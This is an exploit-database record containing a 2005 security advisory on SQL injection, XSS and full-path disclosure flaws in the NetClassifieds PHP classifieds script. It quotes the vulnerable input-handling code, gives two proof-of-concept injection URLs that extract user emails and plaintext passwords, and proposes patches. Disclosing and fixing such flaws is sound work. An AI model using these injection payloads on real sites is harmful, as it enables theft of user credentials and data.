{
  "id": "4092",
  "title": "NetClassifieds - SQL Injection / Cross-Site Scripting / Full Path",
  "cve": "CVE-2005-3978",
  "vuln_type": "sqli",
  "code": "Application: NetClassifieds:\r\n-Free Edition\r\n-Standard Edition\r\n-Professional Edition\r\n-Premium Edition\r\nWeb Site: http://www.scriptdevelopers.net/\r\nVersions: all\r\nPlatform: linux, windows\r\nBug: multiple injection sql , xss , full path\r\nFix Available: Yes\r\n\r\n\r\n-------------------------------------------------------\r\n\r\n1) Introduction\r\n2) Bug\r\n3) The Code\r\n4) Proof of concept\r\n5) Fix\r\n6)Conclusion\r\n\r\n===========\r\n1) Introduction\r\n===========\r\n\r\n\"NetClassifieds Premium Edition has been built on the premise of making every\r\nclassifieds site feel like it was custom written for the purpose for which it's being used.\r\nAutomotive Sites, Horse Sites, Reality Sites, General Classifieds Sites or any other type\r\nof classifieds site you can think of will find a perfect match in NetClassifieds\"\r\n\r\n======\r\n2) Bug\r\n======\r\n\r\ninjection sql , xss , full path\r\n\r\n===============\r\n3) Vulnerable code:\r\n===============\r\nin Common.php\r\n\r\nline 310:\r\n\r\nfunction CCStrip($value)\r\n{\r\nif(get_magic_quotes_gpc() == 0)\r\nreturn $value;\r\nelse\r\nreturn stripslashes($value); // ==> wtf... 0-o\r\n}\r\n\r\n\r\n\r\nligne 350:\r\n\r\nfunction CCGetFromPost($parameter_name, $default_value)\r\n{\r\nglobal $HTTP_POST_VARS;\r\n\r\n$parameter_value = \"\";\r\nif(isset($HTTP_POST_VARS[$parameter_name]))\r\n$parameter_value = CCStrip($HTTP_POST_VARS[$parameter_name]);\r\nelse\r\n$parameter_value = $default_value;\r\n\r\nreturn $parameter_value;\r\n}\r\n\r\n\r\nline 365:\r\n\r\nfunction CCGetFromGet($parameter_name, $default_value)\r\n{\r\nglobal $HTTP_GET_VARS;\r\n\r\n$parameter_value = \"\";\r\nif(isset($HTTP_GET_VARS[$parameter_name]))\r\n$parameter_value = CCStrip($HTTP_GET_VARS[$parameter_name]);\r\nelse\r\n$parameter_value = $default_value;\r\n\r\nreturn $parameter_value;\r\n}\r\n\r\nnothing is filtred ....\r\n\r\nlet's see how it goes in viewcat.php:\r\n\r\nline 63:\r\ninclude(RelativePath . \"/Common.php\");\r\n\r\nline 519:\r\n$this->ds->Parameters[\"urlCatID\"] = CCGetFromGet(\"CatID\", \"\");\r\n\r\nline 909:\r\n$catdb1 = new clsDBNetConnect;\r\n\r\n$catdb1->connect();\r\n\r\n$newSQL1 = \"SELECT cat_id FROM categories WHERE sub_cat_id='\" . CCGetFromGet(\"CatID\", \"\") . \"'\";\r\n\r\n$incat = \"'\" . CCGetFromGet(\"CatID\", \"\") . \"'\";\r\n\r\n\r\nI wont past every line of this code , because EVERY parameter is vulnerable to sql injection , XSS , full path ...\r\n\r\n=====\r\n4)proof of concept\r\n=====\r\n\r\n\r\nexemple of exploitation :\r\n1) http://site.com/ViewCat.php?CatID=-8+union+select+1,email,3+from+users/*\r\n==> ( Database error: Invalid SQL: SELECT name, sub_cat_id, cat_id FROM categories WHERE cat_id=username@mail.com )\r\n\r\n2)http://site.com/ViewCat.php?s_user_id='+union+select+user_password+from+users+where%20user_id=1/*\r\n==> The value in field urls_user_id is not valid. (passwd_PLAIN_TEXT)\r\n\r\n// there's absolutly no encryption in this script for stored password , or sensitive data ...\r\n\r\nevery input are vulnerable to XSS attacks ( there's maybe 40 inputs ... ) via mysql errors , php error , and via\r\nvarious unfiltred forms .\r\n=====\r\n5) Fix\r\n=====\r\nscriptdevelopers has been advised , i dont think they will release any patch at the moment .\r\n\r\nhere's my \"quick patch\" :\r\n\r\n1) in Common.php:\r\nline 30 :\r\nADD:\r\nini_set(display_errors,\"0\");\r\n( in a production mode , no one needs to know your errors .. and this avoid xss via php error )\r\n\r\nligne 350:\r\nfunction CCGetFromPost // for every POST request\r\navant : return $parameter_value;\r\napres : return preg_replace('/[^a-z0-9]/i', '', $parameter_value); //only 0 to 9 and a to z caracters allowed\r\n\r\n\r\nline 365:\r\nfunction CCGetFromGet // for every GET request\r\nreplace :\r\nreturn $parameter_value;\r\nBY\r\nreturn preg_replace('/[^a-z0-9]/i', '', $parameter_value);\r\n\r\n2) in Mysql_db.php\r\nline 52 :\r\nvar $Halt_On_Error = \"yes\"; ## \"yes\" (halt with message), \"no\" (ignore errors quietly), \"report\" (ignore errror, but spit a warning)\r\n\r\nset the value at \"no\" ( by default it's yes )\r\nthis will avoid juicy errors , such as table name and the complete query\r\n\r\n3) imageresizer.php\r\n\r\nline 2:\r\nADD :\r\nini_set(display_errors,\"0\");\r\n( same reason as Common.php )\r\n\r\nline 100 :\r\nreplace : echo(\"<hr color='red'><font color='red'><b>$msg</b></font><br> file=<b>\".__FILE__.\"</b><hr color='red'>\")\r\nBY\r\necho(\"<hr color='red'><font color='red'><b>error while processing your request</b></font><br> <b></b><hr color='red'>\");\r\n\r\n\".__FILE__.\" show the full path, no one need to know where is located your script on the server .\r\nand usually a full path give the username for the ftp , or cpanel .\r\n( /directory/your_user/www/file.php )\r\n\r\n\r\n=====\r\n5) Conclusion\r\n=====\r\n\r\nThis script has not been develloped in a secure way, and it's dangerous\r\nto use it UNPATCHED\r\n\r\n\r\n\r\n\r\n\r\nregards laurent gaffie\r\ncontact : laurent.gaffie@gmail.com\r\n\r\n# milw0rm.com [2007-06-22]",
  "url": "https://www.exploit-db.com/exploits/4092"
}